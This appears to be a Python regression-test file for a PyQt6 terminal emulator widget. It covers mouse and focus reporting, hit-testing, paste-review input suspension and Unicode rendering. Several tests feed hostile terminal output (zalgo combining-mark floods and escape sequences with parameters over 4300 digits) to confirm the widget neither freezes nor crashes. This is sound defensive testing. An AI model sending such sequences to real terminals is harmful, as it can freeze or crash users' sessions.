# keyboard modifiers encoded: Ctrl +16, Alt +8 (Shift is NEVER encoded)
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          Qt.KeyboardModifier.ControlModifier))
ok(_parse_sgr(_asent)[0] == 0 + 16, 'Ctrl+left press encodes the +16 modifier bit')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          Qt.KeyboardModifier.AltModifier))
ok(_parse_sgr(_asent)[0] == 0 + 8, 'Alt+left press encodes the +8 modifier bit')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))

# drag (button held) reports motion +32, coalesced to one report per CELL
_alt._mouse_report_cell = None
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          pos=(40, 40)))
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.LeftButton, pos=(400, 300)))
_dm = _parse_sgr(_asent)
ok(_dm is not None and _dm[0] == 0 + 32, 'left-drag reports motion with the +32 flag')
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.LeftButton, pos=(400, 300)))
eq(_asent, [], 'a drag within the SAME cell is coalesced (no duplicate report)')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton,
                            pos=(400, 300)))

# any-motion (1003), no button held, reports code 3+32 = 35
_alt._mouse_report_cell = None
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton, pos=(120, 90)))
ok(_parse_sgr(_asent)[0] == 3 + 32, 'button-less any-motion reports code 35 (3 + motion)')
# middle- and right-button drags carry their own button code (1/2) + the +32 motion
_alt._mouse_report_cell = None
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.MiddleButton, pos=(300, 200)))
ok(_parse_sgr(_asent)[0] == 1 + 32, 'middle-drag reports code 33 (1 + motion)')
_alt._mouse_report_cell = None
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         buttons=Qt.MouseButton.RightButton, pos=(360, 260)))
ok(_parse_sgr(_asent)[0] == 2 + 32, 'right-drag reports code 34 (2 + motion)')
# Shift keeps motion LOCAL -- it falls through to the base handler, no report
_asent.clear()
_alt.mouseMoveEvent(_mev(QEvent.Type.MouseMove, Qt.MouseButton.NoButton,
                         Qt.KeyboardModifier.ShiftModifier,
                         buttons=Qt.MouseButton.LeftButton, pos=(500, 400)))
eq(_asent, [], 'Shift+drag is local (no motion report)')

# focus in/out reported under 1004
_asent.clear()
_alt.focusInEvent(_QFEv(QEvent.Type.FocusIn))
eq(b''.join(_asent), b'\x1b[I', 'focus-in reports ESC[I under mode 1004')
_asent.clear()
_alt.focusOutEvent(_QFEv(QEvent.Type.FocusOut))
eq(b''.join(_asent), b'\x1b[O', 'focus-out reports ESC[O under mode 1004')

# Shift is the LOCAL override: Shift+wheel and Shift+press write nothing to the child
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, Qt.KeyboardModifier.ShiftModifier, pos=(200, 100)))
eq(_asent, [], 'Shift+wheel is local (no report to the child)')
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                          Qt.KeyboardModifier.ShiftModifier))
eq(_asent, [], 'Shift+press is local text selection (no report)')

# _event_cell clamps: a point past the right/bottom edge clamps to the column/row
# count (a click in the sub-row strip below the last row must not name a row past the
# grid); the top-left corner clamps to 1;1 (never a cell off the grid).
_alt._rows = 24                          # winsize height the child knows its screen as
_asent.clear()
_alt.wheelEvent(_wheel_ev(-120, pos=(100000, 100000)))
_edge = _parse_sgr(_asent)
ok(_edge[1] == 80, 'a point past the right edge clamps col to the grid width')
ok(_edge[2] == 24, 'a point past the bottom edge clamps row to the grid height')
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, pos=(-1000, -1000)))
_c = _parse_sgr(_asent)
ok(_c[1] == 1 and _c[2] == 1, 'a point above/left of the grid clamps to cell 1;1')

# _event_cell reports the row of the glyph ACTUALLY under the pointer, edge to edge --
# not just near the cell centre. Regression: the row math subtracted the document margin
# a SECOND time (contentOffset().y() already carries the top margin), shifting every cell
# down by margin px. A click in a cell's top band then reported the row ABOVE, so a click
# on the top of a control (e.g. Claude Code's "jump to bottom" pill under tmux) missed --
# "sometimes works" (a lower-in-the-cell click still landed). Drive a full alt-screen
# frame through the REAL render path and click ONE PIXEL below each row's top edge; the
# report must name that row. Pre-fix this misreported ~every row's top edge.
from PyQt6.QtGui import QTextCursor as _QTC_hit          # noqa: E402
_hit = SecureTerminal(command='/bin/cat', tui=True)
_hit.show()
_hit.resize(800, 400)
pump(40)
if _hit.current_tui():
    _hrows = _hit._rows
    _hcols = _hit._cols
    _hframe = b'\x1b[?1000h\x1b[?1006h\x1b[2J'          # arm tracking + SGR, clear
    for _hr in range(1, _hrows + 1):
        _hframe += ('\x1b[%d;1H' % _hr).encode() + (('R%02d' % _hr).ljust(_hcols, '.')).encode()
    feed_output(_hit, _hframe)
    pump(60)                                            # let the debounced grid render fire
    ok(_hit._mouse_report_on(), 'hit-test frame: tracking + SGR is armed')
    _hsent = spy_writes(_hit)
    _hbc = _hit.document().blockCount()

    def _cell_top_pt(term, idx):
        _a = _QTC_hit(term.document())
        _a.setPosition(idx)
        _b = _QTC_hit(term.document())
        _b.setPosition(idx + 1)
        _ra, _rb = term.cursorRect(_a), term.cursorRect(_b)
        _x = (_ra.x() + _rb.x()) // 2 if _rb.x() > _ra.x() else _ra.x() + 3
        return (_x, _ra.top() + 1)                      # 1px INTO the cell from its top edge

    _hbad = []
    for _gr in range(1, _hrows + 1):
        _blk = _hit.document().findBlockByNumber(_hbc - _hrows + _gr - 1)
        _hsent.clear()
        _hit.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                                  pos=_cell_top_pt(_hit, _blk.position())))
        _rep = _parse_sgr(_hsent)
        if _rep is None or _rep[2] != _gr:
            _hbad.append((_gr, None if _rep is None else _rep[2]))
        _hit.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))
    ok(not _hbad,
       'a top-edge click reports its OWN row for every grid row (no double-margin skew): '
       'mismatches %r' % _hbad)
_hit.close()

# a button not in the SGR table (e.g. a mouse back-button) is NOT reported; it falls
# through to the local handler
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.BackButton))
eq(_asent, [], 'a non-SGR button (back) is not reported')

# double-click while the child grabs the mouse reports a press, not a word-select
_asent.clear()
_alt.mouseDoubleClickEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
ok(_parse_sgr(_asent) is not None and _parse_sgr(_asent)[3] == 'M',
   'a double-click is reported as a press when the child grabs the mouse')
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))

# CHORD: left+right pressed together each report a press; releasing EACH must report
# its OWN button. Tracking a single button lost the first release, leaving it stuck
# in the child (no protocol release). codex ai-review.
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.RightButton,
                          buttons=Qt.MouseButton.LeftButton | Qt.MouseButton.RightButton))
_asent.clear()
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.RightButton,
                            buttons=Qt.MouseButton.LeftButton))
_chord_r = _parse_sgr(_asent)
_asent.clear()
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))
_chord_l = _parse_sgr(_asent)
ok(_chord_r is not None and _chord_r[0] == 2 and _chord_r[3] == 'm',
   'chord: releasing right reports a right release (code 2, m)')
ok(_chord_l is not None and _chord_l[0] == 0 and _chord_l[3] == 'm',
   'chord: releasing left ALSO reports (code 0, m) -- the button is not left stuck')

# #15: a button pressed WITHOUT shift, then released WHILE shift is held mid-drag, must
# still report the release (the child must not think the button is still down). This is
# correct-by-design -- the release keys off _mouse_report_btns MEMBERSHIP, not Shift --
# so this is a regression-lock: nobody may re-gate the release on Shift.
_alt._mouse_report_btns = set()
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
ok(_parse_sgr(_asent) is not None and _parse_sgr(_asent)[3] == 'M',
   '#15: a plain (no-shift) press is reported')
_asent.clear()
_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton,
                            Qt.KeyboardModifier.ShiftModifier))
_r15 = _parse_sgr(_asent)
ok(_r15 is not None and _r15[0] == 0 and _r15[3] == 'm',
   '#15: a shift-held release is STILL reported (m), balancing the press')
ok(Qt.MouseButton.LeftButton not in _alt._mouse_report_btns,
   '#15: the button is cleared from tracking after the shift-release')

# #34: an unknown theme falls back to the app default 'light' in BOTH the constructor
# and apply_theme -- the old apply_theme fell back to 'dark', so the SAME bad name gave
# a different theme depending on how it arrived (construction vs a later apply).
_t34 = SecureTerminal(command='/bin/cat', theme='bogus')
eq(_t34.current_theme(), 'light', '#34: an invalid theme at construction falls back to light')
_t34.apply_theme('also-bogus')
eq(_t34.current_theme(), 'light',
   '#34: apply_theme ALSO falls back to light (not dark) for an unknown theme')
_t34.close()

# INPUT SUSPENDED during a paste/copy review: with mouse tracking on and the review
# bar up, a NEW click / wheel / focus must NOT write to the child (keyPressEvent
# already refuses keys), nor track a button (which would unbalance a later release).
# grok ai-review.
_alt._review_active = True
_asent.clear()
_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
_alt.focusInEvent(_QFEv(QEvent.Type.FocusIn))
eq(_asent, [],
   'input suspended during review: no mouse / wheel / focus report reaches the child')
ok(not _alt._mouse_report_btns,
   'no button is tracked during review (so no unmatched release fires later)')
# ctl-send-text must ALSO honour the review suspension: the ctl socket has no user,
# so during a review it must NOT push text onto the shell's input line (to
# concatenate with the held paste and submit on the next Enter). Refuse it.
_asent.clear()
_ctlerr = _alt.ctl_send_text('ls')
ok(_ctlerr is not None and _asent == [],
   'ctl-send-text is refused during a paste/copy review (no byte reaches the child)')
_alt._review_active = False
_alt._mouse_selecting = False

# the child resets the modes (well-behaved exit): reporting stops, mouse tracking
# off, and the alt-screen wheel falls back to the arrow surrogate
feed_output(_alt, b'\x1b[?1000l\x1b[?1002l\x1b[?1003l\x1b[?1004l\x1b[?1006l')
ok(not _alt._mouse_report_on() and not _alt.hasMouseTracking(),
   'a full mode reset stops reporting and mouse tracking')
_asent.clear()
_alt._wheel_accum = 0
_alt.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
eq(b''.join(_asent), b'\x1b[B' * 3,
   'after a mode reset the alt-screen wheel falls back to arrow keys')
# focus is NOT reported once 1004 is cleared
_asent.clear()
_alt.focusInEvent(_QFEv(QEvent.Type.FocusIn))
eq(_asent, [], 'focus is not reported once mode 1004 is cleared')
_alt.close()

# A split DECSET mouse-mode marker is still seen across a read() boundary (same
# carry guarantee as the alt-screen scan).
_msplit = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_msplit, b'\x1b[?100')             # half of ?1002h
ok(not _msplit._mouse_modes, 'a half mouse-mode marker does not yet arm the request')
feed_output(_msplit, b'2h\x1b[?1006h')         # completes across the boundary
ok(_msplit._mouse_modes == {1002, 1006},
   'a split mouse-mode marker is detected across the read boundary')
# A stray semicolon (empty param field) is tolerated, not a crash: ESC[?1000;h
# arms 1000 and ignores the empty field.
feed_output(_msplit, b'\x1b[?1000;h')
ok(1000 in _msplit._mouse_modes,
   'a DECSET with an empty param field arms the named mode and ignores the blank')
# A hostile over-long DECSET parameter must NOT crash the read loop: bare int()
# raises above Python's 4300-digit string limit, so the scan parses via _safe_int
# (out-of-range -> 0 -> ignored). Regression for the DoS finding.
feed_output(_msplit, b'\x1b[?' + b'1' * 4301 + b'h')
ok(0 not in _msplit._mouse_modes and isinstance(_msplit._mouse_modes, set),
   'an over-long DECSET parameter is ignored, not a ValueError crash')
# RIS (ESC c) and DECSTR (ESC [ ! p) are FULL resets that clear tracked mouse modes,
# so `reset` (or a program's soft reset) disables tracking that untrusted output
# turned on -- the usual recovery. Folded in ORDER: a reset then a re-enable leaves
# only the re-enabled modes. grok ai-review.
from secure_terminal.sanitize import scan_mouse_modes           # noqa: E402
eq(scan_mouse_modes('\x1bc', {1000, 1006}), set(),
   'scan_mouse_modes: RIS (ESC c) clears all tracked mouse modes')
eq(scan_mouse_modes('\x1b[!p', {1000, 1006}), set(),
   'scan_mouse_modes: DECSTR (ESC [ ! p) clears all tracked mouse modes')
eq(scan_mouse_modes('\x1b[?1000h\x1bc\x1b[?1006h', set()), {1006},
   'scan_mouse_modes: a reset then a re-enable leaves only the re-enabled mode')
_msplit.close()
# end to end through the widget (a fresh tab, so no earlier modes linger): feeding
# RIS clears the tracked modes (the reset-recovery path).
_mris = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_mris, b'\x1b[?1000;1006h')
ok(_mris._mouse_modes == {1000, 1006}, 'widget tracks a combined DECSET')
feed_output(_mris, b'\x1bc')
ok(not _mris._mouse_modes, 'feeding RIS through the widget clears the mouse modes')
_mris.close()

# EOF flush: a program's FINAL output that ends mid-escape must NOT vanish. In CLI
# mode feed_chunk_carry holds a trailing possibly-incomplete escape in _esc_carry;
# on child exit it will never complete, so it is flushed (its payload rendered)
# rather than dropped -- regression for the silent-final-output-loss finding.
_eoft = SecureTerminal(command='/bin/cat', tui=False)
feed_output(_eoft, b'result: \x1b' + b'!' * 50)     # ends with a dangling ESC tail
ok('!' * 50 not in _eoft.transcript_text(),
   'the dangling escape tail is held back, not shown yet')
_er, _ew = os.pipe()                                 # an empty pipe, write end closed:
os.close(_ew)                                        # the next read returns b'' (EOF)
_eoft._fd = _er
_eoft._read_and_render()                             # the child-exit / EOF path
os.close(_er)
_eoft._flush_paint()
ok('result:' in _eoft.transcript_text() and '!' * 50 in _eoft.transcript_text(),
   'child exit flushes the held escape tail -- the final output is not lost')
_eoft.close()
# home-pin: a terminal does not auto-scroll horizontally -- a paint anchors the view at
# the left so the START of every row stays visible (the reported bug: the auto-follow
# parked the viewport mid-line, clipping every row's left edge) -- but NEVER by hiding
# the caret. Box/Show stay NoWrap, so a long line can overflow; Detail/Reveal wrap.
#
# Build the overflow font-robustly. In normal use the child autowraps output at the
# widget's measured column count, so a NoWrap line overflows the width only when a
# glyph renders WIDER than the measured cell (CJK/emoji in Show mode) -- and CI's
# fonts-hack is monospace with no CJK/emoji, so no real glyph is ever wider there and
# that overflow cannot be reproduced (a CJK run renders zero-width and silently
# disarms the canaries -- the local-vs-CI trap this comment exists to prevent).
# Instead disable the autowrap (_cols = 0 -> the hard-wrap falls back to _MAX_LINE) and
# feed a long ASCII run: it stays ONE block and overflows purely by character count, so
# it overflows identically everywhere. The home-pin logic is glyph-agnostic (it works
# on pixel positions), so this exercises it faithfully.
_LONG = 'M' * 800
# Case A: the caret sits at the far right of an overflowing NoWrap line (interactive
# typing past the edge). It MUST stay visible -- home-pinning it off-screen would hide
# the input and block manual scroll. Guards the ai-review regression an unconditional
# home-pin introduced.
_pinA = SecureTerminal(command='/bin/cat')
_pinA.apply_mode('show')                # NoWrap, so the line can overflow horizontally
_pinA.resize(240, 120)
_pinA.show()
APP.processEvents()
_pinA._cols = 0                          # disable the autowrap so the long line overflows
feed_output(_pinA, _LONG.encode('ascii'))                  # caret at the far right, no LF
_hbA = _pinA.horizontalScrollBar()
ok(_hbA.maximum() > _hbA.minimum(),
   'canary: the long Show line overflows the viewport (else caret-visibility is untested)')
_crA = _pinA.cursorRect()
ok(0 <= _crA.x() and _crA.x() + _pinA.cursorWidth() <= _pinA.viewport().width(),
   'home-pin never hides the caret: the FULL caret (its width included, not just the left '
   'edge) stays within the viewport on an overflowing NoWrap line')
_pinA.close()
# Case B: the overflow lives in the scrollback above and the caret is near the start of
# a short current line, so home-pinning keeps the caret visible AND anchors the line
# starts. Scroll fully right, force a repaint: the view re-homes to column 0. On the old
# code ensureCursorVisible only scrolled the caret into view (left edge), leaving the
# line starts off-screen; the home-pin brings them back.
_pinB = SecureTerminal(command='/bin/cat')
_pinB.apply_mode('show')
_pinB.resize(240, 120)
_pinB.show()
APP.processEvents()
_pinB._cols = 0                          # disable the autowrap so the scrollback line overflows
feed_output(_pinB, (_LONG + '\nM').encode('ascii'))        # long scrollback + short current line
_hbB = _pinB.horizontalScrollBar()
ok(_hbB.maximum() > _hbB.minimum(),
   'canary: the scrollback line overflows the viewport before the repaint')
_hbB.setValue(_hbB.maximum())           # scroll fully right
_pinB._paint_dirty = True               # force a repaint of the current line
_pinB._flush_paint()
eq(_hbB.value(), _hbB.minimum(),
   'home-pin: a paint re-homes to column 0 when that keeps the (col-0) caret visible')
_pinB.close()

# F4: the alt-screen (grid) caret sits at the DISPLAY offset of the cursor column, not the
# raw cell column. A cell that renders to more than one UTF-16 unit (an astral glyph, which
# Show mode passes through) advances the document by more than one position, so `+ cursor.x`
# drifts the caret left. A math-bold 'A' (U+1D400: ONE Python char, TWO UTF-16 units) at
# column 0 with the cursor at column 1 must place the caret at document offset 2, not 1.
# The offset counts UTF-16 units, so it is font-agnostic (no CI CJK/emoji-glyph dependence).
_f4 = SecureTerminal(command='/bin/cat', tui=True)
_f4.apply_mode('show')
_f4.resize(240, 120)
_f4.show()
APP.processEvents()
feed_output(_f4, b'\x1b[?1049h\x1b[2J\x1b[H' + '\U0001d400'.encode('utf-8'))
pump(80)
_f4tc = _f4.textCursor()
_f4off = _f4tc.position() - _f4.document().findBlock(_f4tc.position()).position()
ok(_f4off == 2,
   'grid caret sits after a 2-UTF-16-unit astral cell (offset %d), not at cell column 1'
   % _f4off)
_f4.close()

# TUI grid horizontal home-pin (operator regression): the alt screen is a fixed viewport-wide
# canvas, so column 0 must ALWAYS stay visible -- the horizontal analog of the alt-screen
# top-pin (row 0). _place_grid_cursor's setTextCursor fires ensureCursorVisible, which follows
# the caret RIGHT when a wide grid row overflows and parks the view mid-grid (hiding column 0);
# the home-pin re-homes every frame. Build the overflow font-robustly with ASCII: give the pyte
# grid many more columns than the narrow viewport can show, so a full ASCII row overflows the
# width regardless of glyph rendering (no CJK/emoji-width dependence, which CI's fonts-hack
# lacks -- the local-vs-CI trap the _pinA/_pinB comments also guard).
_hs = SecureTerminal(command='/bin/cat', tui=True)
_hs.resize(240, 120)
_hs.show()
APP.processEvents()
feed_output(_hs, b'\x1b[?1049h')          # enter the alt screen (fixed canvas: top + column-0 pinned)
_HSWIDE = 200
_hs._screen.resize(_hs._screen.lines, _HSWIDE)    # widen the pyte grid well past the viewport
_hs._set_winsize(_HSWIDE, _hs._screen.lines)
feed_output(_hs, b'M' * _HSWIDE)          # one full-width ASCII row; the caret ends at the far right
_hs._render_tui()
_hsbar = _hs.horizontalScrollBar()
ok(_hsbar.maximum() > _hsbar.minimum(),
   'canary: the wide ASCII grid row overflows the narrow viewport (else the home-pin is untested)')
ok(_hs.textCursor().positionInBlock() >= _HSWIDE - 1,
   'canary: the grid caret sits at the far-right edge of the overflowing row, so without the '
   'home-pin ensureCursorVisible would scroll RIGHT off column 0')
_hsbar.setValue(_hsbar.maximum())         # park the view scrolled-right, as ensureCursorVisible would
_hs._place_grid_cursor(_hs._screen)       # caret already visible at max -> only the home-pin moves the view
eq(_hsbar.value(), _hsbar.minimum(),
   'TUI grid pins horizontal scroll HOME (column 0 visible) even with the caret at the far right')
_hs.close()

# --- Zalgo flood: a base char plus thousands of stacked combining marks is one
# grapheme cluster that makes the text engine (Qt in CLI mode, pyte's NFC merge in
# TUI mode) reshape it in O(n^2) -- seconds of GUI freeze per line. The CLI cell
# model (feed_line_edits) and _SafeHistoryScreen.draw (TUI) each bound the marks
# per base cell to the Unicode stream-safe maximum -- escape-, read-boundary- and
# cursor-move-proof -- so a flood renders instantly and a real accent still lands.
import time as _tz                                       # noqa: E402
_ac = '\u0301'                                           # combining acute
# structural: the cap holds in every CLI render mode (100 marks -> at most 32 kept)
for _zm in ('show', 'box', 'reveal'):
    _zt = SecureTerminal(command='/bin/cat'); _zt.apply_mode(_zm)
    feed_output(_zt, ('a' + _ac * 100 + '\n').encode('utf-8'))
    ok(_zt.toPlainText().count(_ac) <= 32,
       'zalgo CLI %s: a 100-mark flood is bounded to <= 32 combining marks' % _zm)
# structural: TUI (pyte) bounds the merged cell too. The trailing CJK char is a
# non-combining non-ASCII code point (>= U+0300), so the run resets and it renders
# in its own cell.
_ztu = SecureTerminal(command='/bin/cat', tui=True)
_cjk = '\u4f60'                                  # a non-combining CJK char
feed_output(_ztu, ('a' + _ac * 100 + _cjk + '\n').encode('utf-8'))
ok(len(_ztu._screen.buffer[0][0].data) <= 34,
   'zalgo TUI: the merged pyte cell is bounded (base + capped marks), not 100')
ok(_ztu._screen.buffer[0][1].data == _cjk,
   'zalgo TUI: a non-combining char after the flood resets the run and lands in its own cell')
# TUI full-width line + bare LF: a line that fills the EXACT grid width parks the cursor in
# pyte's last-column-flag state (cursor.x == columns); pyte defers the wrap to the next printable
# char (its own CR+LF), so a BARE LF (no ONLCR carriage return) would advance a SECOND line and
# insert a blank row between every full-width line. _SafeHistoryScreen.linefeed clears the flag
# but KEEPS the column, exactly as a real terminal does (verified against xterm by an ESC[6n DSR
# probe): no blank row, and the next line staircases from the last column -- NOT normalised to
# column 0. So the first B lands in the last column of row 1 and the rest wrap onto row 2.
_fw = SecureTerminal(command='/bin/cat', tui=True)
_fwc = _fw._screen.columns
feed_output(_fw, ('A' * _fwc + '\n' + 'B' * _fwc + '\n').encode('utf-8'))
ok(_fw._screen.buffer[0][0].data == 'A'
   and _fw._screen.buffer[1][_fwc - 1].data == 'B'          # no blank row: first B at the last column
   and _fw._screen.buffer[2][0].data == 'B',                # the rest wrapped onto the next row
   'TUI full-width line + bare LF: the flag clears and the column is kept (xterm-accurate), '
   'so no blank row and the next line staircases from the last column')
_fw.close()
# F3: an oversized CSI parameter must not permanently freeze pyte rendering. pyte's
# int(param) raises ValueError past sys.get_int_max_str_digits() (4300); the raised
# parser generator is then EXHAUSTED, so without a rebuild every later feed is
# silently dropped and the tab's TUI screen stays frozen for the session. _feed_bytes
# rebuilds the parser (screen state is preserved) so rendering recovers next feed.
_f3 = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_f3, b'\x1b[' + b'9' * 4301 + b'C')       # oversized CSI -> pyte ValueError
feed_output(_f3, b'\x1b[HZ')                            # home + 'Z', fed AFTER the crash
ok(_f3._screen.buffer[0][0].data == 'Z',
   'F3: pyte recovers after an oversized-CSI crash (no permanent TUI desync)')
_f3.close()
# a real accent after a flood still lands (the run resets, not a permanent gag)
_zt2 = SecureTerminal(command='/bin/cat'); _zt2.apply_mode('show')
feed_output(_zt2, ('x' + _ac * 100 + 'y' + _ac + '\n').encode('utf-8'))
ok(('y' + _ac) in _zt2.toPlainText(),
   'zalgo: a base char resets the run so a later real accent is not dropped')
# DoS canary: a large flood (under the pipe buffer) renders fast in both modes;
# unbounded it would take tens of seconds, so a wide margin is not flaky
_zc = ('a' + _ac * 4000 + '\n').encode('utf-8')
_zcli = SecureTerminal(command='/bin/cat'); _zcli.apply_mode('show')
_t0 = _tz.monotonic(); feed_output(_zcli, _zc)
ok(_tz.monotonic() - _t0 < 5.0, 'zalgo CLI: a 4000-mark flood renders well under the DoS threshold')
_ztui = SecureTerminal(command='/bin/cat', tui=True)
_t0 = _tz.monotonic(); feed_output(_ztui, _zc)
ok(_tz.monotonic() - _t0 < 5.0, 'zalgo TUI: a 4000-mark flood renders well under the DoS threshold')
# split-read CLI: a child dripping sub-cap chunks (each read reset to 0) must not
# rebuild the cluster; the trailing run carries across _on_readable calls
_zsr = SecureTerminal(command='/bin/cat'); _zsr.apply_mode('show')
for _ in range(6):
    feed_output(_zsr, (_ac * 20).encode('utf-8'))     # 6 reads x 20 marks = 120
ok(_zsr.toPlainText().count(_ac) <= 32,
   'zalgo CLI: a flood split across PTY reads is still bounded to the cap')
# stripped-SGR CLI bypass: an SGR reset between mark-blocks leaves no cell, so the
# marks stay adjacent to one base -- capping on the raw stream would be fooled, but
# the cell-level cap is not
_zsgr = SecureTerminal(command='/bin/cat'); _zsgr.apply_mode('show')
feed_output(_zsgr, ('a' + (_ac * 20 + '\x1b[0m') * 6).encode('utf-8'))
ok(_zsgr.toPlainText().count(_ac) <= 32,
   'zalgo CLI: a stripped SGR between mark-blocks cannot reset the cap')
# a program printing an OSC with a 5000-digit code must NOT crash the app: int()
# raises on a 4300+-digit string (Python 3.11+), and the CLI OSC-notice scan runs
# in a Qt notifier slot -- no feature opt-in is needed to reach it.
_zosc = SecureTerminal(command='/bin/cat'); _zosc.apply_mode('show')
feed_output(_zosc, b'\x1b]' + b'1' * 5000 + b'\n')
ok(isinstance(_zosc.toPlainText(), str),
   'a 5000-digit OSC code does not crash the CLI render (int 4300-digit limit)')
# and a 5000-digit CSI cursor parameter through the live line-mode path
_zcsi = SecureTerminal(command='/bin/cat'); _zcsi.apply_mode('show')
feed_output(_zcsi, b'a\x1b[' + b'9' * 5000 + b'Cb\n')
ok(isinstance(_zcsi.toPlainText(), str),
   'a 5000-digit CSI parameter does not crash the CLI render')
# cursor-move TUI: steer many capped chunks back onto ONE cell via CSI G; the
# per-cell cap must stop it growing unbounded (the stream-run counter could not)
_zcm = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_zcm, b'a')                                # base into cell 0
for _ in range(6):
    feed_output(_zcm, (_ac * 20 + '\x1b[2G').encode('utf-8'))   # marks onto cell 0, cursor back
ok(len(_zcm._screen.buffer[0][0].data) <= 34,
   'zalgo TUI: cursor moves cannot pile combining marks onto one cell past the cap')
# #28: a combining mark at the very screen origin (cursor 0,0) has no preceding cell;
# pyte's own draw() drops it (both its x and y merge branches fail at 0,0). draw() must
# instead OCCUPY the origin cell and mark it -- exactly as it does for a leading zero-width
# non-combining char -- so a dangerous codepoint is never silently dropped. (canary: old
# code routed it to super().draw, which dropped it, leaving buffer[0].get(0) None.)
_zt0 = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_zt0, _ac.encode('utf-8'))
ok(_zt0._screen.buffer[0].get(0) is not None,
   '#28: a combining mark at origin (0,0) occupies its own cell, not dropped')
eq(_zt0._screen.buffer[0][0].data, _ac,
   '#28: the origin cell carries the combining mark so tui_cell can mark it')
ok(_zt0._screen.cursor.x == 1, '#28: the cursor advances past the marked origin cell')
# combining mark at column 0 of a lower row (cursor x=0, y>0): it targets the
# previous row's last cell -- exercises that lookup branch
_ztr = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_ztr, ('abc\r\n' + _ac).encode('utf-8'))
ok(isinstance(_ztr.toPlainText(), str),
   'zalgo TUI: a combining mark at column 0 of a lower row is handled, no crash')

# --- _export_ascii maps the box placeholder to '_' in every mode but Show -----
# A TUI grid renders a neutralized cell as the box placeholder (a <U+XXXX> badge
# cannot fit one cell) in Box/Reveal/Detail, so text LEAVING the widget (copy,
# IPC, session) must map the box back to ASCII '_' in ALL three -- else a copy in
# Reveal/Detail would carry U+25A1 out and raise a spurious unicode review. Show
# keeps the box (it may be a real U+25A1, and Show is the opt-in to copy unicode).
_BOXCH = chr(0x25A1)
_xw = SecureTerminal(command='/bin/cat')
for _xm in ('box', 'reveal', 'detail'):
    _xw._mode = _xm
    ok(_xw._export_ascii('caf' + _BOXCH + 'x') == 'caf_x',
       '_export_ascii maps the box to ASCII _ in %s mode' % _xm)
_xw._mode = 'show'
ok(_xw._export_ascii('caf' + _BOXCH) == 'caf' + _BOXCH,
   '_export_ascii keeps the box in show mode (opt-in to copy unicode)')

# --- "needs TUI" advisory also fires for in-place repaint (zsh ZLE menu) --------
# The bug: an interactive completion menu (zsh/readline) repaints with cursor-up
# and uses no alternate screen, so line mode stripped the redraw into garbage
# WITHOUT advising TUI mode. The advisory must now fire on that repaint too, not
# only on a full-screen (alt-screen) program.
adv = SecureTerminal(command='/bin/cat')
_advices: list[str] = []
adv.advise_signal.connect(_advices.append)
feed_output(adv, b'plain shell output, no redraw here\n')
ok(_advices == [], 'plain line-mode output raises no TUI advisory')
# a completion-menu-style repaint: print a grid, then cursor-up to repaint in place
feed_output(adv, b'cand1  cand2  cand3\n\x1b[2A\x1b[7mcand1\x1b[27m')
ok(len(_advices) == 1 and 'TUI' in _advices[0],
   'an in-place completion-menu repaint (cursor-up, no alt-screen) advises TUI mode')

# COR-1b: a C0 control byte inside an all-ASCII chunk must NOT take pyte's fast path --
# stock pyte draw() breaks its whole batch on the first wcwidth==-1 byte (`else: break`),
# so the C0 AND the rest of the chunk would vanish unmarked. The per-char loop marks it
# and keeps going.
if tui_available():
    _c0 = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_c0, b'AB\x01CD')
    ok(_c0._screen.buffer[0][2].data == 'C' and _c0._screen.buffer[0][3].data == 'D',
       'COR-1b: a C0 byte in an all-ASCII TUI chunk does not drop the trailing output')
